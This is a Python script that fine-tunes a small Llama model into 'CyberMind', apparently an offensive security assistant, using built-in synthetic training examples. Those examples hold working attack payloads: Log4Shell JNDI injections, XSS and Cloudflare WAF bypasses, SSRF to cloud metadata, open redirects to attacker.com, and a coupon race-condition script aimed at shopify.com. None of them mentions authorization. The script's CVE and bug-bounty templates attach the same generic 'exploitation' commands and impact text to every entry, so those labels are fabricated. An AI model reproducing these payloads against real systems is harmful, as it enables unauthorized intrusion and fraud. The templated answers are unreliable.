"""
CyberMind Fine-Tuning Script
Run this in Google Colab with T4 GPU (free)

Step 1: Upload this file to Colab
Step 2: Runtime -> Change runtime type -> T4 GPU
Step 3: Run: !python finetune.py
"""

# ── Install dependencies ──────────────────────────────────────────────────────
import subprocess, sys

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"])

print("[1/6] Installing dependencies...")
for pkg in ["unsloth", "kagglehub", "datasets", "trl", "transformers", "accelerate", "bitsandbytes", "peft"]:
    install(pkg)

# ── Imports ───────────────────────────────────────────────────────────────────
import json, os, random
from pathlib import Path
from datasets import Dataset
from trl import SFTTrainer
from transformers import TrainingArguments

print("[2/6] Loading model (Llama 3.2 3B — fits in free T4 GPU)...")
from unsloth import FastLanguageModel

model, tokenizer = FastLanguageModel.from_pretrained(
    model_name="unsloth/Llama-3.2-3B-Instruct",
    max_seq_length=2048,
    dtype=None,           # auto-detect
    load_in_4bit=True,    # 4-bit quantization — fits in 16GB VRAM
)

# Add LoRA adapters — efficient fine-tuning, only trains 1-2% of params
model = FastLanguageModel.get_peft_model(
    model,
    r=16,
    target_modules=["q_proj", "k_proj", "v_proj", "o_proj", "gate_proj", "up_proj", "down_proj"],
    lora_alpha=16,
    lora_dropout=0,
    bias="none",
    use_gradient_checkpointing="unsloth",
    random_state=42,
)

# ── Load Datasets ─────────────────────────────────────────────────────────────
print("[3/6] Loading datasets...")

all_entries = []

# Dataset 1: Kaggle Bug Hunter
try:
    import kagglehub
    path = kagglehub.dataset_download("vellyy/bug-hunter")
    import pandas as pd
    for csv_file in Path(path).rglob("*.csv"):
        df = pd.read_csv(csv_file, encoding="utf-8", errors="replace")
        # Find title and description columns
        title_col = next((c for c in df.columns if any(k in c.lower() for k in ["title","name","vuln"])), None)
        desc_col  = next((c for c in df.columns if any(k in c.lower() for k in ["desc","detail","report","body"])), None)
        if title_col and desc_col:
            for _, row in df.iterrows():
                t = str(row.get(title_col,"")).strip()
                d = str(row.get(desc_col,"")).strip()
                if t and d and len(d) > 50:
                    all_entries.append({
                        "instruction": f"Analyze this bug bounty finding and explain the vulnerability, impact, and exact exploitation steps:\n\nTitle: {t}",
                        "output": f"## Vulnerability: {t}\n\n{d[:1500]}\n\n## Exploitation\nTest with: nuclei -u https://TARGET -severity critical,high -silent\n\n## Impact\nThis vulnerability allows unauthorized access or data exposure.\n\n## Remediation\nApply vendor patch and implement input validation."
                    })
    print(f"  Kaggle: {len(all_entries)} entries loaded")
except Exception as e:
    print(f"  Kaggle failed: {e} — continuing without it")

# Dataset 2: Figshare CVE Dataset
try:
    import requests
    api = requests.get("https://api.figshare.com/v2/articles/22056617", timeout=30).json()
    files = api.get("files", [])
    if files:
        url = files[0]["download_url"]
        print(f"  Downloading Figshare CVE dataset...")
        r = requests.get(url, timeout=120)
        cve_data = r.json() if r.headers.get("content-type","").startswith("application/json") else []
        if isinstance(cve_data, dict):
            cve_data = cve_data.get("cves", cve_data.get("vulnerabilities", []))
        before = len(all_entries)
        for cve in cve_data[:3000]:
            cid  = cve.get("id", cve.get("cve_id",""))
            desc = cve.get("description", cve.get("desc",""))
            sev  = cve.get("severity","medium")
            if cid and desc and len(desc) > 30:
                all_entries.append({
                    "instruction": f"Explain {cid} and how to detect and exploit it in a bug bounty context. Give exact commands.",
                    "output": f"## {cid} ({sev.upper()})\n\n{desc[:800]}\n\n## Detection\n```bash\nnuclei -u https://TARGET -tags {cid.lower()} -silent\n```\n\n## Exploitation\n```bash\nnuclei -u https://TARGET -t cves/{cid.split('-')[1] if '-' in cid else '2024'}/{cid}.yaml\n```\n\n## Impact\nThis vulnerability allows an attacker to compromise the target.\n\n## Remediation\nApply the vendor security patch immediately."
                })
        print(f"  Figshare CVE: {len(all_entries)-before} entries loaded")
except Exception as e:
    print(f"  Figshare failed: {e} — continuing without it")

# Dataset 3: CyberMind Synthetic (built-in)
SYNTHETIC = [
    # Business Logic
    {"instruction": "Target: shopify.com has an e-commerce checkout. How do you test for price manipulation vulnerabilities? Give exact steps.",
     "output": "## Price Manipulation Testing\n\n**Step 1:** Add item to cart, intercept POST /checkout\n**Step 2:** Modify price parameter:\n```\n{\"items\":[{\"id\":\"PROD123\",\"price\":-99.99,\"qty\":1}]}\n```\n**Step 3:** Test negative price → credit applied\n**Step 4:** Test price=0 → free item\n**Step 5:** Test quantity=-1 → negative total\n\n**Race condition test:**\n```python\nimport threading, requests\ndef apply_coupon():\n    requests.post('https://shopify.com/apply-coupon', json={'code':'SAVE10'}, cookies={'session':'YOUR_SESSION'})\nthreads = [threading.Thread(target=apply_coupon) for _ in range(20)]\n[t.start() for t in threads]; [t.join() for t in threads]\n```\n\n**Expected:** Coupon applied 3-5x instead of once = Race condition bug ($2k-$10k bounty)"},

    # OAuth
    {"instruction": "Target uses OAuth 2.0. Walk me through testing for missing state parameter CSRF vulnerability.",
     "output": "## OAuth State Parameter CSRF Test\n\n**Step 1:** Find OAuth authorization URL:\n```\nhttps://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://target.com/callback\n```\n\n**Step 2:** Remove state parameter and test:\n```bash\ncurl -v 'https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://target.com/callback'\n```\n\n**Vulnerable if:** Server doesn't return error about missing state\n\n**Step 3:** Test open redirect in redirect_uri:\n```\nredirect_uri=https://attacker.com\nredirect_uri=https://target.com@attacker.com\nredirect_uri=https://attacker.com%23target.com\n```\n\n**Impact:** CSRF → account takeover ($5k-$20k bounty)\n\n**Automation:**\n```bash\njwt_tool TOKEN -t https://target.com/api/user -rh 'Authorization: Bearer TOKEN' -M at\n```"},

    # Novel Attacks
    {"instruction": "Standard tools found nothing on target.com (Node.js/Express). What novel attack techniques should I try?",
     "output": "## Novel Attack Techniques for Node.js/Express\n\n**1. Prototype Pollution (HIGH PRIORITY for Node.js)**\n```bash\n# URL test\ncurl 'https://target.com/?__proto__[admin]=true'\ncurl 'https://target.com/?constructor[prototype][admin]=true'\n\n# JSON body test\ncurl -X POST https://target.com/api/user -d '{\"__proto__\":{\"isAdmin\":true}}'\n```\n\n**2. HTTP Request Smuggling**\n```bash\npython3 smuggler.py -u https://target.com -v\n```\n\n**3. SSRF via Webhooks/PDF Generation**\n```bash\ncurl -X POST https://target.com/generate-pdf -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}'\n```\n\n**4. Web Cache Poisoning**\n```bash\ncurl -H 'X-Forwarded-Host: attacker.com' https://target.com/\ncurl -H 'X-Original-URL: /admin' https://target.com/\n```\n\n**5. JWT Algorithm Confusion**\n```bash\njwt_tool YOUR_JWT -X a  # Tests alg:none bypass\n```"},

    # CVE Exploitation
    {"instruction": "Explain Log4Shell (CVE-2021-44228) and how to detect and exploit it in a bug bounty context.",
     "output": "## CVE-2021-44228 — Log4Shell (CVSS 10.0 CRITICAL)\n\n**Vulnerability:** JNDI injection in Apache Log4j 2.x allows unauthenticated RCE via crafted log messages.\n\n**Detection:**\n```bash\n# nuclei (fastest)\nnuclei -u https://TARGET -tags log4j,cve-2021-44228 -silent\n\n# Manual — inject in all headers\ncurl -H 'User-Agent: ${jndi:ldap://YOUR_INTERACTSH_URL/a}' https://TARGET\ncurl -H 'X-Forwarded-For: ${jndi:ldap://YOUR_INTERACTSH_URL/a}' https://TARGET\ncurl -H 'X-Api-Version: ${jndi:ldap://YOUR_INTERACTSH_URL/a}' https://TARGET\n```\n\n**OOB Verification:**\n```bash\ninteractsh-client -server oast.pro -n 1\n# Use the generated URL in payloads above\n# If you get a DNS callback → confirmed RCE\n```\n\n**Impact:** Unauthenticated Remote Code Execution — full server compromise\n\n**Bounty:** $10,000-$100,000+ on major programs"},

    # Agent Decision
    {"instruction": "CyberMind agent: target=api.example.com, recon_done=true, hunt_done=false, tech=GraphQL/Node.js, waf=Cloudflare. What should the agent do next?",
     "output": "## Agent Decision\n\n**Action:** hunt\n**Focus:** idor,ssrf,introspection\n**Confidence:** 88%\n\n**Reasoning:**\nGraphQL + Node.js is a high-value target combination:\n1. GraphQL introspection often enabled → full schema dump → find admin mutations\n2. IDOR via direct object access in GraphQL queries\n3. SSRF via GraphQL queries that fetch external URLs\n\n**Cloudflare WAF bypass strategy:**\n- Use delay: 1000ms between requests\n- Tamper: space2comment,randomcase\n- Headers: X-Forwarded-For: 127.0.0.1\n\n**Exact commands:**\n```bash\n# 1. GraphQL introspection\ncurl -X POST https://api.example.com/graphql -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}\"\n\n# 2. IDOR test\ncurl -X POST https://api.example.com/graphql -d '{\"query\":\"{user(id:2){email,password,token}}\"}'\n\n# 3. Batching attack (rate limit bypass)\ncurl -X POST https://api.example.com/graphql -d '[{\"query\":\"mutation{login(u:\\\"admin\\\",p:\\\"pass1\\\")}\"}]'\n```\n\n**Next after hunt:** If bugs found → exploit phase (Abhimanyu). If nothing → novel attacks."},

    # WAF Bypass
    {"instruction": "Target is behind Cloudflare WAF. My XSS payloads are being blocked. What bypass techniques should I use?",
     "output": "## Cloudflare WAF Bypass for XSS\n\n**1. Encoding bypass:**\n```\n%3Cscript%3Ealert(1)%3C/script%3E  (URL encode)\n%253Cscript%253E                    (double encode)\n\\u003cscript\\u003e                  (unicode)\n&lt;script&gt;                      (HTML entities)\n```\n\n**2. Case variation:**\n```\n<ScRiPt>alert(1)</sCrIpT>\n<SCRIPT>alert(1)</SCRIPT>\n<Script>alert(1)</Script>\n```\n\n**3. Event handler bypass:**\n```\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onpageshow=alert(1)>\n<input autofocus onfocus=alert(1)>\n```\n\n**4. dalfox with WAF bypass:**\n```bash\ndalfox url 'https://TARGET?q=FUZZ' --waf-bypass --delay 1000 --silence\n```\n\n**5. IP bypass headers:**\n```bash\ncurl -H 'X-Forwarded-For: 127.0.0.1' -H 'CF-Connecting-IP: 127.0.0.1' 'https://TARGET?q=<script>alert(1)</script>'\n```\n\n**6. HTTP Request Smuggling to bypass WAF:**\n```bash\npython3 smuggler.py -u https://TARGET -v\n```"},

    # Cloud Misconfig
    {"instruction": "How do you test for S3 bucket misconfigurations in a bug bounty? Give exact commands.",
     "output": "## S3 Bucket Misconfiguration Testing\n\n**Step 1: Generate bucket name variations**\n```bash\nCOMPANY=target\nfor suffix in '' '-backup' '-backups' '-data' '-prod' '-dev' '-staging' '-assets' '-static' '-logs' '-db'; do\n  echo \"${COMPANY}${suffix}\"\ndone > /tmp/buckets.txt\n```\n\n**Step 2: Test public read access**\n```bash\nwhile read bucket; do\n  # AWS S3\n  aws s3 ls s3://$bucket --no-sign-request 2>/dev/null && echo \"PUBLIC READ: $bucket\"\n  # Direct URL\n  curl -s \"https://$bucket.s3.amazonaws.com/\" | grep -q 'ListBucketResult' && echo \"PUBLIC: $bucket\"\ndone < /tmp/buckets.txt\n```\n\n**Step 3: Test public write**\n```bash\naws s3 cp /tmp/test.txt s3://TARGET-BUCKET/cybermind_test.txt --no-sign-request\n# If succeeds → public write = critical bug\n```\n\n**Step 4: GCS buckets**\n```bash\ncurl -s \"https://storage.googleapis.com/TARGET-BUCKET/\" | grep -q 'ListBucketResult' && echo 'GCS PUBLIC'\n```\n\n**Step 5: Firebase**\n```bash\ncurl -s \"https://TARGET.firebaseio.com/.json\" | grep -v 'null' && echo 'FIREBASE OPEN'\n```\n\n**Step 6: Automated with cloud_enum**\n```bash\npip3 install cloud-enum\ncloud_enum -k TARGET -l /tmp/cloud_results.txt\n```\n\n**Impact:** Public S3 = $5k-$50k bounty on major programs"},

    # Mobile Security
    {"instruction": "How do you perform security testing on an Android APK for bug bounty? Give complete methodology.",
     "output": "## Android APK Security Testing\n\n**Step 1: Decompile APK**\n```bash\napktool d target.apk -o /tmp/decompiled/\njadx -d /tmp/jadx_output/ target.apk\n```\n\n**Step 2: Find hardcoded secrets**\n```bash\ngrep -r 'api_key\\|apikey\\|secret\\|password\\|token\\|AWS\\|firebase' /tmp/jadx_output/ --include='*.java'\ngrep -r 'AKIA[0-9A-Z]\\{16\\}' /tmp/jadx_output/  # AWS keys\ngrep -r 'AIza[0-9A-Za-z-_]\\{35\\}' /tmp/jadx_output/  # Google API keys\n```\n\n**Step 3: Extract API endpoints**\n```bash\ngrep -r 'https\\?://' /tmp/jadx_output/ --include='*.java' | grep -v 'schema\\|example\\|w3.org'\n```\n\n**Step 4: SSL Pinning Bypass (Frida)**\n```bash\n# Install frida\npip3 install frida-tools\n\n# Push frida-server to device\nadb push frida-server /data/local/tmp/\nadb shell chmod 755 /data/local/tmp/frida-server\nadb shell /data/local/tmp/frida-server &\n\n# Bypass SSL pinning\nfrida -U -f com.target.app --no-pause -l ssl_bypass.js\n```\n\n**Step 5: Test API endpoints with captured traffic**\n```bash\n# Route through ZAP after SSL bypass\nadb shell settings put global http_proxy 192.168.1.X:8090\n# Now all app traffic goes through ZAP\n```\n\n**Common findings:** Hardcoded AWS keys ($5k+), insecure API endpoints, IDOR in user IDs"},
]

before = len(all_entries)
all_entries.extend(SYNTHETIC)
print(f"  Synthetic: {len(all_entries)-before} entries loaded")
print(f"\n  TOTAL: {len(all_entries)} training examples")

# ── Format Dataset ────────────────────────────────────────────────────────────
print("[4/6] Formatting dataset...")

ALPACA_PROMPT = """Below is an instruction from a security researcher. Write a response that provides expert-level guidance.

### Instruction:
{}

### Response:
{}"""

EOS_TOKEN = tokenizer.eos_token

def format_prompts(examples):
    instructions = examples["instruction"]
    outputs = examples["output"]
    texts = []
    for instruction, output in zip(instructions, outputs):
        text = ALPACA_PROMPT.format(instruction, output) + EOS_TOKEN
        texts.append(text)
    return {"text": texts}

# Convert to HuggingFace Dataset
random.shuffle(all_entries)
hf_dataset = Dataset.from_list(all_entries)
hf_dataset = hf_dataset.map(format_prompts, batched=True)

print(f"  Dataset ready: {len(hf_dataset)} examples")

# ── Train ─────────────────────────────────────────────────────────────────────
print("[5/6] Starting fine-tuning (this takes ~2 hours on T4 GPU)...")

trainer = SFTTrainer(
    model=model,
    tokenizer=tokenizer,
    train_dataset=hf_dataset,
    dataset_text_field="text",
    max_seq_length=2048,
    dataset_num_proc=2,
    packing=False,
    args=TrainingArguments(
        per_device_train_batch_size=2,
        gradient_accumulation_steps=4,
        warmup_steps=5,
        num_train_epochs=3,
        learning_rate=2e-4,
        fp16=True,
        logging_steps=10,
        optim="adamw_8bit",
        weight_decay=0.01,
        lr_scheduler_type="linear",
        seed=42,
        output_dir="cybermind_model",
        save_strategy="epoch",
        report_to="none",
    ),
)

trainer_stats = trainer.train()
print(f"  Training complete! Time: {trainer_stats.metrics['train_runtime']:.0f}s")

# ── Save Model ────────────────────────────────────────────────────────────────
print("[6/6] Saving model...")

# Save LoRA adapters
model.save_pretrained("cybermind_lora")
tokenizer.save_pretrained("cybermind_lora")
print("  LoRA adapters saved: cybermind_lora/")

# Save merged model (for Ollama)
model.save_pretrained_merged("cybermind_merged", tokenizer, save_method="merged_16bit")
print("  Merged model saved: cybermind_merged/")

# Save GGUF for Ollama (quantized, smaller)
model.save_pretrained_gguf("cybermind_gguf", tokenizer, quantization_method="q4_k_m")
print("  GGUF model saved: cybermind_gguf/ (use this with Ollama)")

print("""
============================================================
FINE-TUNING COMPLETE!

Your model is saved in 3 formats:
  cybermind_lora/    — LoRA adapters (upload to HuggingFace)
  cybermind_merged/  — Full merged model
  cybermind_gguf/    — GGUF format (use with Ollama locally)

NEXT STEPS:
  1. Download cybermind_gguf/ folder from Colab
  2. On your PC: ollama create cybermind -f Modelfile
  3. Test: cybermind /plan example.com --local
  4. Or set Groq key: cybermind /groq-setup gsk_YOUR_KEY

See convert_to_ollama.sh for detailed instructions.
============================================================
""")
